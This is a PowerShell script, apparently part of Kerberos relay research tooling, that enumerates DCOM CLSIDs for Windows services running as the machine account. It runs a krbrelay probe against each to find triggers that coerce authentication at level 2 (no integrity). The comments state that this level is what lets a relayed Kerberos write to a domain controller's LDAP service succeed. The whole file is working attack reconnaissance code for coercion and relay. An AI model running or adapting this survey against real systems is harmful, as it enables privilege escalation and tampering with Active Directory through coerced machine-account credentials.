# Survey DCOM triggers for a level-2 (no-integrity) coerced context.
#
# The coerced auth level is a property of the backing service, not the CLSID, so
# this probes one representative CLSID per service. It covers services that run as
# the machine account (LocalSystem or NetworkService), skips disabled services,
# and bounds each probe with a timeout. It runs the probe exe with KRBRELAY_PROBE
# set (no relay needed) and reports the coerced auth level.
#
# auth_level=2 (CONNECT, no integrity) is the one that makes the direct-kerberos
# post-bind write work. auth_level=5/6 (packet integrity/privacy) blocks it.
#
# Run in an operator session (the coercion does not fire in a session-0 WinRM
# shell). Point -Exe at the built probe exe from branch exp/direct-kerberos.
#
#   .\survey_triggers.ps1 -Exe .\krbrelay.exe
#
param(
    [string]$Exe = ".\krbrelay.exe",
    [string]$Spn = "ldap/dc.mayyhem.com",
    [int]$TimeoutSec = 8
)

$env:KRBRELAY_PROBE = "1"
$Exe = (Resolve-Path $Exe).Path

# AppID -> service name, for AppIDs that name a local service.
$appidToSvc = @{}
Get-ChildItem 'HKLM:\SOFTWARE\Classes\AppID' -ErrorAction SilentlyContinue | ForEach-Object {
    $ls = (Get-ItemProperty $_.PSPath -Name 'LocalService' -ErrorAction SilentlyContinue).LocalService
    if ($ls) { $appidToSvc[$_.PSChildName.ToUpper()] = $ls }
}

# Services that run as the machine account and are not disabled. LocalSystem and
# NetworkService both authenticate as the computer account on the network.
# LocalService is anonymous, so it is excluded.
$svcInfo = @{}
Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
    $machine = ($_.StartName -eq 'LocalSystem') -or ($_.StartName -like '*NetworkService')
    if ($machine -and $_.StartMode -ne 'Disabled') {
        $svcInfo[$_.Name.ToLower()] = @{ Mode = $_.StartMode; Account = $_.StartName }
    }
}

# One representative CLSID per backing service.
$svcToClsid = @{}
Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | ForEach-Object {
    $appid = (Get-ItemProperty $_.PSPath -Name 'AppID' -ErrorAction SilentlyContinue).AppID
    if ($appid -and $appidToSvc.ContainsKey($appid.ToUpper())) {
        $svc = $appidToSvc[$appid.ToUpper()].ToLower()
        if ($svcInfo.ContainsKey($svc) -and -not $svcToClsid.ContainsKey($svc)) {
            $svcToClsid[$svc] = $_.PSChildName
        }
    }
}

Write-Host ("[*] {0} candidate services (LocalSystem/NetworkService, not disabled), one CLSID each" -f $svcToClsid.Count)
$tmp = [System.IO.Path]::GetTempFileName()
$err = "$tmp.err"
foreach ($svc in ($svcToClsid.Keys | Sort-Object)) {
    $clsid = $svcToClsid[$svc]
    $p = Start-Process -FilePath $Exe `
        -ArgumentList @('127.0.0.1', '9999', $Spn, '127.0.0.1', '7989', $clsid) `
        -NoNewWindow -PassThru -RedirectStandardOutput $tmp -RedirectStandardError $err
    $note = ""
    if (-not $p.WaitForExit($TimeoutSec * 1000)) {
        try { $p.Kill() } catch {}
        $note = "TIMEOUT"
    }
    $out = ((Get-Content $tmp, $err -ErrorAction SilentlyContinue) -join "`n")
    $probe = (($out -split "`r?`n") | Where-Object { $_ -match '\[probe\]' }) -join ' '
    if (-not $probe) { $probe = (($out -split "`r?`n") | Where-Object { $_ -match 'stage' }) -join ' ' }
    "{0}  svc={1} acct={2} start={3} {4} => {5}" -f $clsid, $svc, $svcInfo[$svc].Account, $svcInfo[$svc].Mode, $note, $probe.Trim()
}
Remove-Item $tmp, $err -ErrorAction SilentlyContinue
